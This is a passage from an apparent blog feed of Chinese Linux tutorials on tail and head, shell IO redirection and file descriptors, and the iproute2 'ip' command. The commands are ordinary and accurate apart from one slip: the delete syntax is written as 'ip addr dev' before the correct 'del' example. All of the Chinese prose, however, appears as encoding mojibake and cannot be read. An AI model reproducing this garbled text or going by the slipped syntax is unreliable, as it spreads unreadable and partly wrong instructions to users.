è¡Œ</span><br><span class="line">æ­£æ•°ç¬¬43 è¡Œï¼Œ å€’æ•°ç¬¬8 è¡Œ</span><br><span class="line">æ­£æ•°ç¬¬44 è¡Œï¼Œ å€’æ•°ç¬¬7 è¡Œ</span><br><span class="line">æ­£æ•°ç¬¬45 è¡Œï¼Œ å€’æ•°ç¬¬6 è¡Œ</span><br><span class="line">æ­£æ•°ç¬¬46 è¡Œï¼Œ å€’æ•°ç¬¬5 è¡Œ</span><br><span class="line">æ­£æ•°ç¬¬47 è¡Œï¼Œ å€’æ•°ç¬¬4 è¡Œ</span><br><span class="line">æ­£æ•°ç¬¬48 è¡Œï¼Œ å€’æ•°ç¬¬3 è¡Œ</span><br><span class="line">æ­£æ•°ç¬¬49 è¡Œï¼Œ å€’æ•°ç¬¬2 è¡Œ</span><br><span class="line">æ­£æ•°ç¬¬50 è¡Œï¼Œ å€’æ•°ç¬¬1 è¡Œ</span><br><span class="line">tail: &#x27;test.log&#x27; has become inaccessible: No such file or directory</span><br><span class="line">tail: &#x27;test.log&#x27; has appeared;  following new file</span><br><span class="line">æ­£æ•°ç¬¬1 è¡Œï¼Œ å€’æ•°ç¬¬50 è¡Œ</span><br><span class="line">æ­£æ•°ç¬¬2 è¡Œï¼Œ å€’æ•°ç¬¬49 è¡Œ</span><br><span class="line">æ­£æ•°ç¬¬3 è¡Œï¼Œ å€’æ•°ç¬¬48 è¡Œ</span><br><span class="line">æ­£æ•°ç¬¬4 è¡Œï¼Œ å€’æ•°ç¬¬47 è¡Œ</span><br><span class="line">æ­£æ•°ç¬¬5 è¡Œï¼Œ å€’æ•°ç¬¬46 è¡Œ</span><br><span class="line">æ­£æ•°ç¬¬6 è¡Œï¼Œ å€’æ•°ç¬¬45 è¡Œ</span><br></pre></td></tr></table></figure></p><p>è‡³äºä¸ºä»€ä¹ˆåé¢æ˜¯ä» <code>æ­£æ•°ç¬¬1 è¡Œ</code>å¼€å§‹æ˜¾ç¤ºï¼Œæ˜¯å› ä¸º Pythoné€è¡Œå†™å…¥ï¼Œç„¶å tail åœ¨å†™å…¥ä¸€è¡Œåï¼Œå°±è¯»å–å¯¼è‡´çš„ã€‚ ä½ å¯ä»¥ä½¿ç”¨ Heredocumentï¼Œ å°±å¯ä»¥çœ‹åˆ°æ­£å¸¸çš„ç»“æœäº†ã€‚</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> &lt;&lt;- <span class="string">EOF &gt; test.log</span></span></span><br><span class="line">æ­£æ•°ç¬¬41 è¡Œï¼Œ å€’æ•°ç¬¬10 è¡Œ</span><br><span class="line">æ­£æ•°ç¬¬42 è¡Œï¼Œ å€’æ•°ç¬¬9 è¡Œ</span><br><span class="line">æ­£æ•°ç¬¬43 è¡Œï¼Œ å€’æ•°ç¬¬8 è¡Œ</span><br><span class="line">æ­£æ•°ç¬¬44 è¡Œï¼Œ å€’æ•°ç¬¬7 è¡Œ</span><br><span class="line">æ­£æ•°ç¬¬45 è¡Œï¼Œ å€’æ•°ç¬¬6 è¡Œ</span><br><span class="line">æ­£æ•°ç¬¬46 è¡Œï¼Œ å€’æ•°ç¬¬5 è¡Œ</span><br><span class="line">æ­£æ•°ç¬¬47 è¡Œï¼Œ å€’æ•°ç¬¬4 è¡Œ</span><br><span class="line">æ­£æ•°ç¬¬48 è¡Œï¼Œ å€’æ•°ç¬¬3 è¡Œ</span><br><span class="line">æ­£æ•°ç¬¬49 è¡Œï¼Œ å€’æ•°ç¬¬2 è¡Œ</span><br><span class="line">æ­£æ•°ç¬¬50 è¡Œï¼Œ å€’æ•°ç¬¬1 è¡Œ</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure></p></li><li><p>æ˜¾ç¤ºå¤šä¸ªæ–‡ä»¶ï¼Œ ç©ºæ ¼åˆ†éš”å³å¯ã€‚ ä¸º <code>tail</code>ç»™äºˆå¤šä¸ªæ–‡ä»¶è¾“å…¥å‚æ•°ï¼Œå®ƒä¼šå±•ç¤ºæ¯ä¸ªæ–‡ä»¶å¤¹çš„æœ€å 10 è¡Œã€‚<code>tail filename1.txt filename2.txt</code> ä¾‹å¦‚ï¼š<code>tail filename1.txt filename2.txt</code></p><p>æ­¤å¤–ï¼Œä½ ä¹Ÿå¯ä»¥ä½¿ç”¨å’Œæ˜¾ç¤ºä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œå¯ç”¨çš„ç›¸åŒå‚æ•°ã€‚</p></li><li><p>tail ä¸å…¶ä»–å‘½ä»¤æ­é…</p><ol type="1"><li>ä¸ grep ä½¿ç”¨ ç›‘æ§ apache çš„è®¿é—®æ—¥å¿—æ–‡ä»¶ï¼Œåªæ˜¾ç¤ºé‚£äº›åŒ…å«ipï¼š192.168.42.12 çš„ã€‚<code>tail -f /var/log/apache2/access.log | grep 192.168.42.12</code></li><li>ä¸ ps ä½¿ç”¨ï¼ŒæŸ¥çœ‹ top n çš„å ç”¨æŸä¸€èµ„æºçš„è¿›ç¨‹<code>ps aux | sort -nk +3 | tail -5</code> æ˜¾ç¤º top 5 å ç”¨ CPUèµ„æºçš„è¿›ç¨‹ã€‚</li></ol></li><li><p>head ä¸å…¶ä»–å‘½ä»¤ä½¿ç”¨ headå‘½ä»¤å¯ä»¥ä¸å…¶ä»–å‘½ä»¤ç»“åˆä½¿ç”¨ï¼Œé€šè¿‡ç®¡é“å°†æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°å…¶ä»–ç¨‹åºã€‚ä¾‹å­ï¼šå¯¹ç¯å¢ƒå˜é‡ <code>$RANDOM</code> å– sha512 æ‘˜è¦ï¼Œç„¶åè¾“å‡ºå‰ 24ä¸ªå­—ç¬¦ã€‚<code>echo $RANDOM | sha512sum | head -c 24 ; echo</code></p></li></ol><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><p><a href="https://linuxize.com/post/linux-tail-command/">Linux TailCommand</a></p><p><a href="https://linuxize.com/post/linux-head-command/">Linux HeadCommand</a></p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> head </tag>
            
            <tag> tail </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux IO é‡å®šå‘ï¼Œæ–‡ä»¶æè¿°ç¬¦</title>
      <link href="/blog/2020/07/13/linux/tools/ioredirect_fd/"/>
      <url>/blog/2020/07/13/linux/tools/ioredirect_fd/</url>
      
        <content type="html"><![CDATA[<h2 id="è¾“å…¥é‡å®šå‘">è¾“å…¥é‡å®šå‘</h2><h3 id="ç®¡é“">ç®¡é“</h3><p>é€šè¿‡ <code>echo</code> å‘½ä»¤å’Œç®¡é“ä¼ é€’</p><p>ä¸è¦ä»¥ä¸ºç”±ç®¡é“ä¸²èµ·çš„ä¸¤ä¸ªå‘½ä»¤ä¼šä¾æ¬¡æ‰§è¡Œã€‚Linuxç³»ç»Ÿå®é™…ä¸Šä¼š<strong>åŒæ—¶è¿è¡Œ</strong>è¿™ä¸¤ä¸ªå‘½ä»¤ï¼Œåœ¨ç³»ç»Ÿå†…éƒ¨å°†å®ƒä»¬è¿æ¥èµ·æ¥ã€‚<strong>åœ¨ç¬¬ä¸€ä¸ªå‘½ä»¤äº§ç”Ÿè¾“å‡ºçš„åŒæ—¶ï¼Œè¾“å‡ºä¼šè¢«ç«‹å³é€ç»™ç¬¬äºŒä¸ªå‘½ä»¤</strong>ã€‚æ•°æ®ä¼ è¾“ä¸ä¼šç”¨åˆ°ä»»ä½•ä¸­é—´æ–‡ä»¶æˆ–ç¼“å†²åŒºã€‚</p><p><code>tee</code> å¤åˆ¶ pipe æ–‡ä»¶æµ</p><p>å‘½ä»¤ä½œç”¨ï¼šåœ¨ç®¡é“ä¸­é—´å¤åˆ¶ä¸€ä»½æ ‡å‡†è¾“å…¥ï¼Œç„¶åæ¥ç€ä¼ é€’ç®¡é“çš„æ ‡å‡†è¾“å…¥ï¼ˆå¹¶ä¸æ”¹å˜æ ‡å‡†è¾“å…¥ï¼‰ã€‚</p><blockquote><p>In computing, tee is a command in command-line interpreters (shells)using standard streams which reads standard input and writes it to bothstandard output and one or more files, effectively duplicating itsinput.It is primarily used in conjunction with pipes and filters. Thecommand is named after the T-splitter used in plumbing.</p></blockquote><p><code>tee filename</code>å°†æ ‡å‡†è¾“å…¥çš„å†…å®¹<strong>è¦†ç›–</strong>åˆ°æ–‡ä»¶ä¸€ä»½<code>tee -a filename</code>å°†æ ‡å‡†è¾“å…¥çš„å†…å®¹<strong>è¿½åŠ </strong>åˆ°æ–‡ä»¶ä¸€ä»½</p><h2 id="ç›´æ¥é€šè¿‡æ–‡ä»¶é‡å®šå‘">ç›´æ¥é€šè¿‡æ–‡ä»¶é‡å®šå‘</h2><p><code>python input_need.py &lt; input_content.txt</code></p><h2 id="è¾“å‡ºé‡å®šå‘">è¾“å‡ºé‡å®šå‘</h2><h2 id="å‘½ä»¤æ›¿æ¢">å‘½ä»¤æ›¿æ¢</h2><p>shellè„šæœ¬ä¸­æœ€æœ‰ç”¨çš„ç‰¹æ€§ä¹‹ä¸€å°±æ˜¯å¯ä»¥ä»å‘½ä»¤è¾“å‡ºä¸­æå–ä¿¡æ¯ï¼Œå¹¶å°†å…¶èµ‹ç»™å˜é‡ã€‚æŠŠè¾“å‡ºèµ‹ç»™å˜é‡ä¹‹åï¼Œå°±å¯ä»¥éšæ„åœ¨è„šæœ¬ä¸­ä½¿ç”¨äº†ã€‚è¿™ä¸ªç‰¹æ€§åœ¨å¤„ç†è„šæœ¬æ•°æ®æ—¶å°¤ä¸ºæ–¹ä¾¿ã€‚</p><p>å‘½ä»¤æ›¿æ¢å’Œé‡å®šå‘æœ‰äº›ç›¸ä¼¼ï¼Œä½†åŒºåˆ«åœ¨äºå‘½ä»¤æ›¿æ¢æ˜¯å°†ä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºä½œä¸ºå¦å¤–ä¸€ä¸ªå‘½ä»¤çš„å‚æ•°ã€‚</p><p>å°†å‘½ä»¤è¾“å‡ºèµ‹ç»™å˜é‡çš„ä¸¤ç§æ–¹æ³•ï¼š</p><ol type="1"><li>åå¼•å· (`)</li><li><code>$()</code> æ ¼å¼</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command1 `command2`</span><br></pre></td></tr></table></figure><h3 id="ç¤ºä¾‹">ç¤ºä¾‹</h3><ol type="1"><li><p>å½“ä½ æƒ³ç»Ÿè®¡æŸä¸ªç›®å½•ä¸‹æ‰€æœ‰ï¼ˆæˆ–è€…ä¸€éƒ¨åˆ†ï¼‰æ–‡ä»¶çš„å­—æ•°æ—¶ï¼Œä¸‹é¢ä¸ºç»Ÿè®¡å½“å‰ç›®å½•ä¸‹<code>test</code> ç›¸å…³æ–‡ä»¶çš„å­—æ•°ï¼š</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">wc</span> `<span class="built_in">ls</span> |grep <span class="built_in">test</span>`</span></span><br><span class="line">5  13  61 test</span><br><span class="line">9  20 198 test.py</span><br><span class="line">3   4  26 test_subshell.sh</span><br></pre></td></tr></table></figure></p></li><li><p>æå–æ—¥æœŸä¿¡æ¯æ¥ç”Ÿæˆæ—¥å¿—æ–‡ä»¶å</p><p><code>touch $(date +%y%m%d%H%M).log</code></p></li></ol><h3 id="æ³¨æ„">æ³¨æ„</h3><p>å‘½ä»¤æ›¿æ¢ä¼šåˆ›å»ºä¸€ä¸ªå­ shell æ¥è¿è¡Œå¯¹åº”çš„å‘½ä»¤ã€‚å­shellï¼ˆsubshellï¼‰æ˜¯ç”±è¿è¡Œè¯¥è„šæœ¬çš„ shell æ‰€åˆ›å»ºå‡ºæ¥çš„ä¸€ä¸ªç‹¬ç«‹çš„å­shellï¼ˆchild shellï¼‰ã€‚æ­£å› å¦‚æ­¤ï¼Œç”±è¯¥å­ shell æ‰€æ‰§è¡Œå‘½ä»¤æ˜¯æ— æ³•ä½¿ç”¨è„šæœ¬ä¸­æ‰€åˆ›å»ºçš„å˜é‡çš„ã€‚</p><h2 id="è®¾å¤‡æ–‡ä»¶">è®¾å¤‡æ–‡ä»¶</h2><p>å…ˆäº†è§£ä¸€ä¸‹è®¾å¤‡æ–‡ä»¶ï¼Œåœ¨ Linuxç³»ç»Ÿä¸­ä¸€åˆ‡çš†å¯ä»¥çœ‹æˆæ˜¯æ–‡ä»¶ï¼Œæ–‡ä»¶åˆå¯åˆ†ä¸ºï¼šæ™®é€šæ–‡ä»¶ã€ç›®å½•æ–‡ä»¶ã€é“¾æ¥æ–‡ä»¶å’Œè®¾å¤‡æ–‡ä»¶ã€‚</p><p>è®¾å¤‡æ–‡ä»¶ï¼š</p><p><ahref="https://blog.csdn.net/longerzone/article/details/12948925">Linuxä¸‹çš„ä¸¤ä¸ªç‰¹æ®Šçš„æ–‡ä»¶ -- /dev/null å’Œ /dev/zero ç®€ä»‹åŠå¯¹æ¯”</a></p><h2 id="æ–‡ä»¶æè¿°ç¬¦">æ–‡ä»¶æè¿°ç¬¦</h2><p>æ–‡ä»¶æè¿°ç¬¦ï¼ˆfiledescriptorï¼‰æ˜¯å†…æ ¸ä¸ºäº†é«˜æ•ˆç®¡ç†å·²è¢«æ‰“å¼€çš„æ–‡ä»¶æ‰€åˆ›å»ºçš„ç´¢å¼•ï¼Œå…¶æ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ï¼ˆé€šå¸¸æ˜¯å°æ•´æ•°ï¼‰ï¼Œç”¨äºæŒ‡ä»£è¢«æ‰“å¼€çš„æ–‡ä»¶ï¼Œæ‰€æœ‰æ‰§è¡ŒI/O æ“ä½œçš„ç³»ç»Ÿè°ƒç”¨éƒ½é€šè¿‡æ–‡ä»¶æè¿°ç¬¦ã€‚ç³»ç»Ÿåˆ›å»ºçš„æ¯ä¸ªè¿›ç¨‹é»˜è®¤ä¼šæ‰“å¼€ 3ä¸ªæ–‡ä»¶ï¼Œæ ‡å‡†è¾“å…¥(0)ã€æ ‡å‡†è¾“å‡º(1)ã€æ ‡å‡†é”™è¯¯(2)ã€‚å¦‚æœæ­¤æ—¶å»æ‰“å¼€ä¸€ä¸ªæ–°çš„æ–‡ä»¶ï¼Œå®ƒçš„æ–‡ä»¶æè¿°ç¬¦ä¼šæ˜¯3ã€‚POSIX æ ‡å‡†è¦æ±‚æ¯æ¬¡æ‰“å¼€æ–‡ä»¶æ—¶ï¼ˆå«socketï¼‰å¿…é¡»ä½¿ç”¨å½“å‰è¿›ç¨‹ä¸­æœ€å°å¯ç”¨çš„æ–‡ä»¶æè¿°ç¬¦å·ç ï¼Œå› æ­¤ï¼Œåœ¨ç½‘ç»œé€šä¿¡è¿‡ç¨‹ä¸­ç¨ä¸æ³¨æ„å°±æœ‰å¯èƒ½é€ æˆä¸²è¯ã€‚</p><table><thead><tr class="header"><th>æ–‡ä»¶æè¿°ç¬¦</th><th>ç”¨é€”</th><th>POSIX åç§°</th><th>stdio æµ</th></tr></thead><tbody><tr class="odd"><td>0</td><td>æ ‡å‡†è¾“å…¥</td><td>STDIN_FILENO</td><td>stdin0</td></tr><tr class="even"><td>1</td><td>æ ‡å‡†è¾“å‡º</td><td>STDOUT_FILENO</td><td>stdout</td></tr><tr class="odd"><td>2</td><td>æ ‡å‡†é”™è¯¯</td><td>STDERR_FILENO</td><td>stderr</td></tr></tbody></table><p>Usage:</p><ul><li>The general form of this one is M&gt;/dev/null, where "M" is a filedescriptor number. This will redirect the file descriptor, "M", to/dev/null.</li><li>The general form of this one is M&gt;&amp;N, where "M" &amp; "N" arefile descriptor numbers. It combines the output of file descriptors "M"and "N" into a single stream.</li></ul><ol type="1"><li><p>å°†æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°ç©ºè®¾å¤‡æ–‡ä»¶ <code>&gt;/dev/null</code> æˆ–è€…<code>1&gt;/dev/null</code> if a number isn't explicitly given, thennumber 1 is assumed by the shell (bash)</p></li><li><p>å°†æ ‡å‡†é”™è¯¯é‡å®šå‘åˆ°ç©ºè®¾å¤‡æ–‡ä»¶ <code>2&gt;/dev/null</code></p></li><li><p>æ··åˆæ ‡å‡†é”™è¯¯å’Œæ ‡å‡†è¾“å‡ºåˆ°ä¸€ä¸ªæµ <code>2&gt;&amp;1</code>ï¼Œå³ï¼šå°†æ ‡å‡†é”™è¯¯å’Œæ ‡å‡†è¾“å‡ºæ··åˆåœ¨ä¸€ä¸ªæµï¼Œç„¶ååœ¨è¿›è¡Œé‡å®šå‘ç­‰ï¼Œå¦‚ï¼š<code>cat file &gt; /dev/null 2&gt;&amp;1</code></p></li><li><p>æ··åˆæ ‡å‡†é”™è¯¯å’Œæ ‡å‡†è¾“å‡ºåˆ°ä¸€ä¸ªæµ(ç®€å†™)<code>&amp;&gt;/dev/null</code> This is just an abbreviation for&gt;/dev/null 2&gt;&amp;1. It redirects file descriptor 2 (STDERR) anddescriptor 1 (STDOUT) to /dev/null.</p></li></ol><p>ä¸ªäººä¹ æƒ¯ä½¿ç”¨ï¼š<code>&gt;/dev/null</code> å’Œ<code>2&gt;/dev/null</code> å’Œ <code>&amp;&gt;/dev/null</code>åˆ†åˆ«å®ç°é‡å®šå‘æ ‡å‡†è¾“å‡ºã€æ ‡å‡†é”™è¯¯ã€æ··åˆ ä¸‰ç§ç›®çš„ã€‚</p><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><p><a href="https://www.cnblogs.com/irockcode/p/6619049.html">é‡å®šå‘stdin stdout stderr</a></p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ioredirect </tag>
            
            <tag> pipe </tag>
            
            <tag> fd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iproute2</title>
      <link href="/blog/2020/07/13/linux/tools/iproute2/"/>
      <url>/blog/2020/07/13/linux/tools/iproute2/</url>
      
        <content type="html"><![CDATA[<h2 id="ç®€ä»‹">ç®€ä»‹</h2><p>Linux ä¸Šç®¡ç†ç½‘ç»œçš„å·¥å…·æœ‰ä¸¤ç§ï¼Œä¸€ä¸ªæ˜¯ net-tools ä¸­æä¾›çš„ifconfigï¼Œä¸€ä¸ªæ˜¯ iproute2 æä¾›çš„ ip addrã€‚net-tools èµ·æºä¸ BSDï¼Œè‡ª 2001å¹´èµ·ï¼ŒLinux ç¤¾åŒºå°±åœæ­¢äº†å¯¹è¿™ä¸ªå·¥å…·çš„ç»´æŠ¤ï¼Œè€Œ iproute2æ—¨åœ¨å–ä»£è¿™ä¸ªå·¥å…·ï¼Œå¹¶æä¾›ä¸€äº›æ–°åŠŸèƒ½ã€‚</p><p>iproute2 æ˜¯ linux ä¸‹ç®¡ç†æ§åˆ¶ TCP/IPç½‘ç»œå’Œæµé‡æ§åˆ¶çš„æ–°ä¸€ä»£å·¥å…·åŒ…ï¼Œæ—¨åœ¨æ›¿ä»£è€æ´¾çš„å·¥å…·é“¾net-toolsï¼Œå³å¤§å®¶æ¯”è¾ƒç†Ÿæ‚‰çš„ ifconfigï¼Œarpï¼Œrouteï¼Œnetstat ç­‰å‘½ä»¤ã€‚</p><p>è™½ç„¶ net-toolså¾ˆæ—©å°±ä¸ç»´æŠ¤äº†ï¼Œä½†æ˜¯ç›®å‰å¾ˆå¤šå‘è¡Œç‰ˆè¿˜æ˜¯é»˜è®¤å®‰è£…ç€å®ƒï¼Œå› æ­¤ï¼Œæˆ‘ä¹Ÿæ²¡è§‰å¾—æ€ä¹ˆæ ·ã€‚ä»Šå¤©ï¼Œç”±äºéœ€è¦æµ‹è¯•<code>ettercap</code>ï¼Œ æˆ‘æ€€ç–‘æ˜¯ Archå®˜æ–¹ä»“åº“é‡Œé¢é‚£ä¸ªåŒ…æ‰“çš„æœ‰é—®é¢˜ï¼Œæˆ‘åé¦ˆäº†ï¼Œè¿˜æ²¡ä¿®å¤ï¼Œå› æ­¤ï¼Œç›´æ¥ä¸Š kaliï¼Œçœ‹æœ¬æœº IP çš„æ—¶å€™ï¼Œæˆ‘å‘ç° ifconfig æ²¡äº†ï¼Œäºæ˜¯ä¸€ç•ªæŸ¥è¯¢ï¼ŒçŸ¥é“ï¼Œkaliæ¨èä½¿ç”¨çš„ <code>ip</code>ï¼Œ å¼ƒç”¨äº† net-toolsäº†ï¼Œå› æ­¤æˆ‘è§‰å¾—æœ‰å¿…è¦å­¦ä¹ ä¸€æ³¢çš„ <code>ip</code> å‘½ä»¤äº†ã€‚</p><p>net-tools é€šè¿‡ <code>procfs(/proc)</code> å’Œ <code>ioctl</code>ç³»ç»Ÿè°ƒç”¨å»è®¿é—®å’Œæ”¹å˜å†…æ ¸ç½‘ç»œé…ç½®ï¼Œè€Œ iproute2 åˆ™é€šè¿‡ netlinkå¥—æ¥å­—æ¥å£ä¸å†…æ ¸é€šä¿¡ã€‚</p><h2 id="è¯­æ³•ä¸ä½¿ç”¨">è¯­æ³•ä¸ä½¿ç”¨</h2><p><code>man ip</code> å¯å¾—:</p><p><code>ip [ OPTIONS ] OBJECT &#123; COMMAND | help &#125;</code></p><p><code>OBJECT</code> æ˜¯ä½ è¦ç®¡ç†çš„å¯¹è±¡ç±»å‹ï¼Œæœ€å¸¸ç”¨çš„å‡ ä¸ªæ˜¯ï¼š</p><ul><li><code>link(l)</code> æ˜¾ç¤ºå’Œä¿®æ”¹ç½‘å¡ï¼ˆä¾‹å¦‚å¯ç”¨/ç¦ç”¨æŸä¸ªç½‘ç»œè®¾å¤‡ã€‚ä¿®æ”¹ mac åœ°å€ï¼‰</li><li><code>address(a)</code> æ˜¾ç¤ºå’Œä¿®æ”¹ IP åœ°å€</li><li><code>route(r)</code> æ˜¾ç¤ºå’Œä¿®æ”¹è·¯ç”±è¡¨</li><li><code>neigh(n)</code> æ˜¾ç¤ºå’Œæ“ä½œç›¸é‚»å¯¹è±¡ï¼ˆARP è¡¨ï¼‰</li></ul><p><code>OBJECT</code> å¯ä»¥ä»¥å…¨åæˆ–è€…ç¼©å†™çš„å½¢å¼ä½¿ç”¨ã€‚å¯ä»¥é€šè¿‡<code>ip OBJECT help</code>ï¼ˆå°† OBJECT æ›´æ¢ä¸ºä½ è¦æŸ¥è¯¢çš„å¯¹è±¡ï¼‰æ¥æ˜¾ç¤ºè¯¥å¯¹è±¡çš„å‘½ä»¤å’Œå‚æ•°åˆ—è¡¨ã€‚</p><p>æ³¨æ„ï¼šå½“é…ç½®ç½‘å¡çš„æ—¶å€™ï¼Œéœ€è¦ä»¥ root èº«ä»½æˆ–è€… <code>sudo</code>æƒé™æ¥æ‰§è¡Œå‘½ä»¤ï¼Œå¦åˆ™ä¼šæŠ¥é”™æƒé™ä¸è¶³ã€‚</p><p>é€šè¿‡ <code>ip</code>å‘½ä»¤åœ¨ç»ˆç«¯è¿›è¡Œçš„é…ç½®ä¸æ˜¯æ°¸ä¹…çš„ï¼Œç³»ç»Ÿé‡å¯ä¹‹åï¼Œæ‰€æœ‰çš„æ”¹å˜éƒ½å°†ä¸¢å¤±ã€‚å¦‚æœæƒ³è¦æ°¸ä¹…åœ°é…ç½®ï¼Œä½ éœ€è¦ç¼–è¾‘ä½ æ‰€ä½¿ç”¨çš„å‘è¡Œç‰ˆå¯¹åº”çš„ç‰¹å®šçš„é…ç½®æ–‡ä»¶æˆ–è€…æ·»åŠ å‘½ä»¤åˆ°å¼€æœºè„šæœ¬çš„æ–¹å¼ã€‚</p><h2 id="æ˜¾ç¤ºå’Œä¿®æ”¹-ip-åœ°å€">æ˜¾ç¤ºå’Œä¿®æ”¹ IP åœ°å€</h2><p>å‘½ä»¤æ ¼å¼ï¼š <code>ip addr [ COMMAND ] ADDRESS dev IFNAME</code></p><p><code>addr</code> å¯¹è±¡æœ€å¸¸ç”¨çš„å‘½ä»¤æ˜¯ <code>show</code>,<code>add</code> å’Œ <code>del</code>ã€‚</p><h3 id="æ˜¾ç¤ºæ‰€æœ‰-ip-åœ°å€çš„ä¿¡æ¯">æ˜¾ç¤ºæ‰€æœ‰ IP åœ°å€çš„ä¿¡æ¯</h3><p>æ˜¾ç¤ºæ‰€æœ‰çš„ç½‘å¡ä»¥åŠ IP åœ°å€ç±»å‹åˆ—è¡¨ï¼š<code>ip addr show</code>ï¼ˆå»æ‰<code>show</code> ç»“æœä¸€æ ·ï¼‰ å¦‚æœä½ æƒ³è¦åªæ˜¾ç¤º IPv4 æˆ–è€… IPv6çš„åœ°å€ï¼Œé‚£ä¹ˆä½¿ç”¨ <code>ip -4 addr</code> æˆ– <code>ip -6 addr</code></p><h3 id="æ˜¾ç¤ºå•ä¸ªç½‘å¡çš„ä¿¡æ¯">æ˜¾ç¤ºå•ä¸ªç½‘å¡çš„ä¿¡æ¯</h3><p>ä½¿ç”¨ <code>ip addr show dev</code> åé¢è·Ÿç€ç½‘å¡åï¼Œä¾‹å¦‚ï¼š<code>eno1</code> ç½‘å¡</p><p><code>ip addr show dev eth0</code>ï¼ˆå»æ‰ dev ç»“æœä¸€æ ·ï¼‰</p><h3 id="è®¾ç½®ç½‘å¡-ip-åœ°å€">è®¾ç½®ç½‘å¡ IP åœ°å€</h3><p><code>ip addr add ADDRESS dev IFNAME</code></p><p><code>ADDRESS</code> æ˜¯ä½ æƒ³è¦èµ‹å€¼ç»™ç½‘å¡çš„ IP <code>IFNAME</code>æ˜¯ç½‘å¡çš„åç§°</p><p>ä¾‹å¦‚ï¼š å°†å­ç½‘æ©ç ä¸º 24 çš„ IPï¼š<code>192.168.121.45</code> èµ‹å€¼ç»™ç½‘å¡<code>eno1</code></p><p><code>sudo ip address add 192.168.121.45/24 dev eno1</code></p><h3 id="èµ‹å€¼å¤šä¸ª-ip-ç»™åŒä¸€ä¸ªç½‘å¡">èµ‹å€¼å¤šä¸ª IP ç»™åŒä¸€ä¸ªç½‘å¡</h3><p>ç½‘å¡å’Œ IP åœ°å€å¹¶ä¸æ˜¯ä¸€ä¸€å¯¹åº”å…³ç³»ã€‚é€šè¿‡ ip å‘½ä»¤å¯ä»¥ä¸´æ—¶è®¾ç½®å¤š IPåŒç½‘å¡ï¼Œä½†æ˜¯é‡å¯åè®¾ç½®ä¹Ÿæ˜¯ä¼šæ¶ˆå¤±çš„ã€‚</p><ol type="1"><li><p>å¤šç½‘å¡åŒ IPï¼š é€šè¿‡ç»‘å®šå¤šä¸ªç½‘å¡ä½œä¸ºä¸€ä¸ªé€»è¾‘ç½‘å£å¹¶é…ç½®å•ä¸ªçš„ IPåœ°å€ï¼Œå¤§å¹…æå‡æœåŠ¡å™¨çš„ç½‘ç»œååæ€§èƒ½ã€‚</p></li><li><p>åŒç½‘å¡å¤š IPï¼š</p><p>åœ¨å®æ–½æœåŠ¡å™¨è™šæ‹ŸåŒ–æ—¶ï¼Œå•ä¸ªç‰©ç†ç½‘å¡å¾€å¾€æ˜¯æœ‰å¤šä¸ª IPåœ°å€ï¼Œå¤šä¸ªè™šæ‹ŸæœåŠ¡å™¨åœ¨åŒä¸€ç‰©ç†ç¡¬ä»¶ä¸Šè¿è¡Œï¼Œæ¯ä¸ªè™šæ‹ŸæœåŠ¡å™¨éƒ½éœ€è¦è‡ªå·±çš„ IPåœ°å€ã€‚</p></li></ol><p>ç”¨æ³•ï¼šç›´æ¥ä¸º ç½‘å¡èµ‹å€¼å¤šæ¬¡ä¸åŒ ip å³å¯ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ip address add 192.168.121.241/24 dev eno1</span><br><span class="line">sudo ip address add 192.168.121.45/24 dev eno1</span><br></pre></td></tr></table></figure><p>å¯ä»¥é€šè¿‡ <code>ip -4 addr show dev eth0</code> æˆ–<code>ip -4 a show dev eth0</code> ç¡®è®¤ IP èµ‹å€¼æ“ä½œå·²å®Œæˆã€‚</p><h3 id="åˆ é™¤ç½‘å¡çš„-ip-åœ°å€">åˆ é™¤ç½‘å¡çš„ IP åœ°å€</h3><p>è¯­æ³•ï¼š <code>ip addr dev ADDRESS dev IFNAME</code></p><p>ä¾‹å¦‚ï¼šç§»é™¤ <code>eno1</code> ç½‘å¡çš„ <code>192.168.121.45/24</code>åœ°å€ï¼š</p><p><code>sudo ip address del 192.168.121.45/24 dev eno1</code></p><h2 id="æ˜¾ç¤ºç½‘å¡">æ˜¾ç¤ºç½‘å¡</h2><p>å‘½ä»¤: <code>ip link show</code> è¯¥å‘½ä»¤ä¸ä¼šè¾“å‡ºè¯¥ç½‘å¡å…³è”çš„ IPåœ°å€ã€‚</p><p>è·å¾—æŸä¸ªç½‘å¡çš„ä¿¡æ¯ï¼š<code>ip link show dev</code>ä¾‹å¦‚ï¼š<code>ip link show dev eno1</code></p><h3 id="å¯ç”¨ç¦ç”¨ç½‘å¡">å¯ç”¨ç¦ç”¨ç½‘å¡</h3><p>å‘½ä»¤ï¼š <code>ip link set dev &#123;DEVICE&#125; &#123;up|down&#125;</code></p><p>ä¾‹å¦‚ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 